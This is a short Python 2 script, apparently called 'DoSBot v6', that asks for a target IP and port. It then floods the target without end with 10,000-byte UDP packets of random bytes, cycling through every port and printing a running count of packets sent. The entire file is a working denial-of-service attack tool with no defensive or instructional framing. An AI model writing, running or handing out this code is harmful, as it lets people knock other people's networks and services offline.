import sys;
import os;
import time;
import socket;
import random;
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM);
bytes = random._urandom(10000);
timeout = time.time();

os.system("clear");
print ("""
\033[1;36;40m
 ______   _______  _______  _______  _______  _______ 
|      | |       ||       ||  _    ||       ||       |
|  _    ||   _   ||  _____|| |_|   ||   _   ||_     _|
| | |   ||  | |  || |_____ |       ||  | |  |  |   |  
| |_|   ||  |_|  ||_____  ||  _   | |  |_|  |  |   |  
|       ||       | _____| || |_|   ||       |  |   |  
|______| |_______||_______||_______||_______|  |___|v6
""");
ip = raw_input("\033[1;36;40mIP: \033[1;33;40m");
os.system("clear");
print ("""
\033[1;36;40m
 ______   _______  _______  _______  _______  _______ 
|      | |       ||       ||  _    ||       ||       |
|  _    ||   _   ||  _____|| |_|   ||   _   ||_     _|
| | |   ||  | |  || |_____ |       ||  | |  |  |   |  
| |_|   ||  |_|  ||_____  ||  _   | |  |_|  |  |   |  
|       ||       | _____| || |_|   ||       |  |   |  
|______| |_______||_______||_______||_______|  |___|v6
""");
port = input("\033[1;36;40mPort: \033[1;33;40m");
os.system("clear");
sent = 0;
while True:
     while 1:
        if time.time() > timeout:
            break;
        else:
            pass;
     sock.sendto(bytes, (ip, port));
     sent = sent + 1;
     port = port + 1;
     print "\033[1;32;40m%s (%s:%s)" %(sent, ip, port);
     if port == 65534:
       port = 1;
